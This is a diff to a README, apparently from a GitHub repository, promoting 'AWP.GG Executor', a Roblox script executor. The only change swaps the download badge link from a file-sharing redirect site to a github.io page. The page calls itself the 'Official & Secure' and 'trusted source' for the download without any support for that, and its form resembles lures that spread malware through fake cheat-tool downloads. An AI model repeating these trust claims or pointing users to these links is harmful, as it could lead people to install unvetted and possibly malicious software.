@@ -1,7 +1,7 @@
 # Official & Secure Download Source for AWP.GG Executor – The Precision-Powered Roblox Script Executor! 🔍🎯🚀  
 This GitHub repository is the trusted source for downloading AWP.GG Executor, a fast, reliable, and feature-rich script executor designed for Roblox players and developers. Whether you're just starting with Lua scripting or are an experienced developer seeking advanced tools, this is your go-to place to get the latest version of AWP.GG.
 
-**[![Download AWP.GG Executor](https://img.shields.io/badge/Download-AWP.GG%20Executor-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download AWP.GG Executor](https://img.shields.io/badge/Download-AWP.GG%20Executor-blueviolet)](https://awp-gg-executor-1-roblox-executor.github.io/.github/)**
 
 ✨ **What You'll Find Here:**  
 - **Latest Stable Release**: Always access the newest version of AWP.GG Executor directly from this repository.  
